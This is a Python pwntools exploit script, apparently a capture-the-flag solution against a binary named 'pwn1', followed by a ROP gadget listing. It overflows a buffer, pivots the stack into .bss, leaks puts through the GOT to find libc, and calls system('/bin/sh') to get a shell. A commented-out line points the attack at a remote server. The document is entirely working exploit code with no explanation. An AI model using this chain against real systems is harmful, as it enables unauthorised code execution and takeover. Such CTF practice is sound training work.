from pwn import *
context(log_level='debug',os='linux',arch='amd64',terminal=['tmux','splitw','-h'])


io=process("./pwn1")
# io=remote("1.13.251.106",8005)
elf=ELF("./pwn1")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")

puts_got=elf.got[b"puts"]
puts_plt=elf.plt[b"puts"]
bss_addr=0x404040+0x700
pop_rdi_ret=0x401283
leave_ret=0x401214
read_text=0x4011FD
main=0x4011db

gdb.attach(io)
pause()

io.recvuntil(b"\n")
payload=cyclic(0x60)+p64(bss_addr)+p64(read_text)
io.send(payload)

payload=p64(0)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main)
payload=payload.ljust(0x60,b"a")+p64(bss_addr-0x60)+p64(leave_ret)

io.send(payload)
base_addr=u64(io.recvuntil(b"\x7f").ljust(8,b"\x00"))-libc.sym[b"puts"]
print("base_addr:  "+hex(base_addr))

sys_addr=base_addr+libc.sym[b"system"]
str_bin_sh=base_addr+next(libc.search(b"/bin/sh"))

io.recvuntil(b"\n")
payload=p64(pop_rdi_ret)+p64(str_bin_sh)+p64(sys_addr)
payload=payload.ljust(0x60,b"a")+p64(bss_addr-0xa8)+p64(leave_ret)
io.sendline(payload)


io.interactive()

# Gadgets information
# ============================================================
# 0x0000000000401214 : leave ; ret
# 0x000000000040127c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040127e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401280 : pop r14 ; pop r15 ; ret
# 0x0000000000401282 : pop r15 ; ret
# 0x000000000040127b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040127f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040115d : pop rbp ; ret
# 0x0000000000401283 : pop rdi ; ret
# 0x0000000000401281 : pop rsi ; pop r15 ; ret
# 0x000000000040127d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret

# Unique gadgets found: 12